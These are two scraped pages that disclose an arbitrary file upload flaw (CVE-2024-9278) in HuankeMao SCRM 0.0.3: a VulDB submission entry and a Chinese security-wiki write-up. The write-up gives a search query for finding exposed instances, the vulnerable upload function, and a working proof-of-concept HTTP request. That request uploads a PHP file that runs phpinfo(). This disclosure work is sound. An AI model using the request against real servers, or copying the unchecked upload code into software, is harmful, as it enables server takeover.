=== Content from vuldb.com_c5d6eef5_20250110_181839.html ===
![VulDB](/_thm/vuldb.png)

* Home
  + Overview
  + [Live Recent](?live.recent)
  + [Live Updates](?live.updates)
  + [Live Archive](?live.archive)
  + [Live Submits](?live.submits)
* [Entries](?recent)
  + [Recent](?recent)
  + [Updates](?updates)
  + [Commits](?commits)
  + [Archive](?archive)
  + [CNA](?cna)
  + [Stats](?stats)
  + [Submits](?submits)
  + [Add](?id.add)
* [Products](?product)
  + [Vendor](?vendor)
  + [Product](?product)
  + [Type](?type)
* [Risk](?cvssv3)
  + [CVSSv4](?cvssv4)
  + [CVSSv3](?cvssv3)
  + [CVSSv2](?cvssv2)
  + [Risks](?risk)
  + [Exploits](?exploits)
* [Threat](?cti)
  + [Analysis](?cti.analyze)
  + [Activities](?activities)
  + [Events](?events)
  + [Actors](?actor)
  + [IP addresses](?ip)
  + [Country](?country)
  + [Sector](?sector)
  + [Exploit Prices](?exploitprices)
* [References](?references)
  + [References](?references)
  + [Tools](?tools)
  + [Videos](?videos)
  + [Google Hacking](?googlehacking)
  + [Exports](?export)
* [Search](?search)

  + [Search](?search)
  + [Advanced Search](?search.advanced)
  + [User](?user)
  + [Feeds](?feeds)
  + [API](?kb.api)
* [Support](?kb)
  + [Knowledge Base](?kb)
  + [FAQ](?kb.faq)
  + [Changelog](?kb.changelog)
  + [Roadmap](?kb.roadmap)
  + [Status](?status)
  + [Contact](?contact)
* [Login](?login)
  + [Login](?login)
  + [Signup](?signup)
  + [Purchase](?pay)
  + [Terms of Use](?kb.terms)

* [Live](?live.submits)
* [Submits](?submits)
* [Add](?id.add)
* [Policy](?kb.submission)
* [Purchase](?pay)

[Login](?login)[Signup](?signup)🛡 Home[Submit](?submit)410393
# Submit #410393: Huankemao SCRM 0.0.3 Unrestricted Upload[info](?kb.submission)

| Title | Huankemao SCRM 0.0.3 Unrestricted Upload |
| --- | --- |
| Description | HuankeMao SCRM is a data-driven, finely operated service system based on Enterprise WeChat, helping businesses achieve intelligent, simple, friendly, and detailed customer operation management. There is an arbitrary file upload vulnerability in the backend of the HuanKeMao SCRM 0.0.3. Attackers can exploit this vulnerability to upload backdoor files and gain server privileges. Github：https://github.com/huankemao/huankemao-php The vulnerability is located in the `upload\_domain\_verification\_file` function of the `WxkConfig.php` file in the `app\admin\controller\v1` directory. |
| Source | ⚠️ https://wiki.shikangsi.com/post/share/96b7d919-1749-4e2b-bda2-b80d2fd23865 |
| User | [wiki (UID 72124)](?user.72124) |
| Submission | 09/18/2024 11:33 AM (4 months ago) |
| Moderation | 09/27/2024 07:36 AM (9 days later) |
| Status | [Accepted](?kb.submission) |
| VulDB Entry | [278660](?id.278660) [HuankeMao SCRM up to 0.0.3 Administrator Backend WxkConfig.php upload\_domain\_verification\_file unrestricted upload] |
| Points | 20 |

[◂ Previous](?submit.410392)[Overview](?submit)[Next ▸](?submit.410394)

# Do you need the next level of professionalism?

Upgrade your account now!

## Notice

Submissions are made by [VulDB community users](?user). VulDB is *not responsible* for their content nor the links to external sources.

Please use the raw information shown and the links listed *with caution*. They might contain malicious and harmful actions, code or data.

The corresponding VulDB entries contain the moderated, verified, and normalized information provided within the raw submission.

## Documentation

* [Submission Policy](?kb.submission)
* [Data Processing](?kb.processing)
* [CVE Handling](?kb.cna)
[© 1997-2025 vuldb.com](?kb.terms) · [cc by-nc-sa](https://creativecommons.org/licenses/by-nc-sa/4.0/)[de](/de/?submit.410393 "German") · [fr](/fr/?submit.410393 "French") · [it](/it/?submit.410393 "Italian") · [es](/es/?submit.410393 "Spanish") · [pt](/pt/?submit.410393 "Portuguese") · [ru](/ru/?submit.410393 "Russian") · [pl](/pl/?submit.410393 "Polish") · [sv](/sv/?submit.410393 "Swedish") · [zh](/zh/?submit.410393 "Chinese") · [ja](/ja/?submit.410393 "Japanese") · [ar](/ar/?submit.410393 "Arabic")[v18.14.7](?kb.changelog)

=== Content from wiki.shikangsi.com_42264262_20250110_181841.html ===

# 安全团队贡献平台

导航切换

* [首页](/)
* 所有信息
  + [所有情报](/list/all/)
  + [推荐专区](/list/recommend/)
  + [综合情报](/list/wiki/)
  + [用户提交](/list/userpost/)
  + [高校情报](/list/school/)
* [排行榜](/user/)
* [礼品中心](/gift/)
* [搜索](/search/)
* [公告](/announcements/)
* [IPwhois新功能](/ip/)
* [WooYun drops新功能](/wooyun/)
* 更多
  + [edudata平台](https://wiki.shikangsi.com/cas/jump/edudata)
  + [零组知识库-006应急响应目录](https://wiki.shikangsi.com/post/3629/)
  + [零组知识库-007内网渗透目录](https://wiki.shikangsi.com/post/3631/)
  + [零组知识库-009安全技术目录](https://wiki.shikangsi.com/post/3632/)
  + [零组知识库-010域渗透目录](https://wiki.shikangsi.com/post/3633/)
  + [零组知识库-011运维与二进制安全目录](https://wiki.shikangsi.com/post/3634/)
  + [XSS平台](https://wiki.shikangsi.com/cas/jump/xss)
  + [edusrc数据分析](http://data.shikangsi.com/)
  + [友情链接](https://wiki.shikangsi.com/links/)
  + [wiki社区](https://wiki.shikangsi.com/zone/)

[提交贡献](/add/)

[登录](/login/)

[注册](/register/)

# 【原创】（CVE-2024-9278）HuankeMao SCRM <=0.0.3 文件上传漏洞

---

分享
### 当前为私密分享，无需登录即可查看。

---

| 时间 | 作者 | 可见性 | 等级 | Rank |
| --- | --- | --- | --- | --- |
|| 2024-09-16 19:58:23 | [jackieya](/profile/948/) | 公开的 | 高危 | 3 |
| --- | --- | --- | --- | --- |

CVE-2024-9278
Created: 09/27/2024 07:41 AM
Changes: 09/27/2024 07:41 AM (57)
Submitter: jackieya@wiki

---

# 漏洞描述

> 唤客猫SCRM 是一款基于企业微信的数据化精细运营服务系统，帮助企业实现智慧、简单、友好、精细 的客户运营管理。

唤客猫SCRM <=0.0.3 的管理员后台存在任意文件上传漏洞，攻击者可以利用该漏洞上传后门文件从而获取服务器权限。

```
- HuankeMao SCRM is a data-driven, finely operated service system based on Enterprise WeChat, helping businesses achieve intelligent, simple, friendly, and detailed customer operation management.
- There is an arbitrary file upload vulnerability in the backend of the HuanKeMao SCRM 0.0.3. Attackers can exploit this vulnerability to upload backdoor files and gain server privileges.

```

github项目地址：https://github.com/huankemao/huankemao-php

```
Github：https://github.com/huankemao/huankemao-php

```
# 资产测绘

`body="唤客猫"`

![null](/media/images/2024/09/16/4be98b13-31fe-4566-87ff-61361c216f38-esPI3ttS.png)

![null](/media/images/2024/09/16/97f4c225-699a-4210-bc10-e230b192e43c-B1lrolt1.png)

# 漏洞分析

漏洞点位于app\admin\controller\v1\WxkConfig.php的upload\_domain\_verification\_file函数中：

```
- The vulnerability is located in the `upload_domain_verification_file` function of the `WxkConfig.php` file in the `app\admin\controller\v1` directory.

```
```
public function upload_domain_verification_file(){
        if (!isset($_FILES['domain_verification_file'])){
            response(500, '文件为空');
        }
        move_uploaded_file($_FILES['domain_verification_file']['tmp_name'], $_FILES['domain_verification_file']['name']);

        response(200, '操作成功', $_SERVER['HTTP_HOST'] . '/' . $_FILES['domain_verification_file']['name']);
    }

```

这里没有对上传文件进行严格校验，直接上传到网站根目录了。

```
- There is no verification for the upload file type here, you can directly upload the file to the website root directory

```
# POC

该漏洞需要登录到后台进行利用：

```
- This vulnerability requires logging into the backend for exploitation
- After logging in, click on the "Settings" icon in the upper right corner of the page

```

![null](/media/images/2024/09/16/44b0c57b-cdd4-4028-8b4b-0cb2e6621c75-7vQi4j5Y.png)

点击“上传校验文件”按钮

```
- Click the "Upload verification file" button

```

![null](/media/images/2024/09/16/56aa1835-5c83-4a57-9b28-f48a6be6138c-C7INlM5O.png)

上传个txt文件后抓包，将文件后缀改为php，得到下面这个poc：

```
- After uploading a txt file and intercepting the data packet, change the file suffix to php to obtain the following POC:

```
```
POST /admin.php/upload_domain_verification_file HTTP/1.1
Host: 127.0.0.1:83
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Length: 685

------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name="time"

1726487021
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name="user_id"

71712684-324d-dbcc-f654-fee216e6453e
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name="token"

fa4808a150e55b8aec0aa1bbea7438174e265464
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name="sign"

46908fde63883cae06d059a4972809dd
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name="domain_verification_file"; filename="1.php"
Content-Type: text/plain

<?php phpinfo();?>
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ--

```

上传后访问http://127.0.0.1:83/1.php,成功执行phpinfo()代码

```
- Access after uploading http://127.0.0.1:83/1.php Successfully executed the php info () code

```

![null](/media/images/2024/09/16/7c4311ca-f4b1-41a2-a9ae-49391ebdbbfb-4n5NIJzU.png)

---

审核评价： 没有任何评价...

2014-2022 © 联系邮箱：admin@sg95.cn    [鄂ICP备15020128号-4](https://beian.miit.gov.cn)


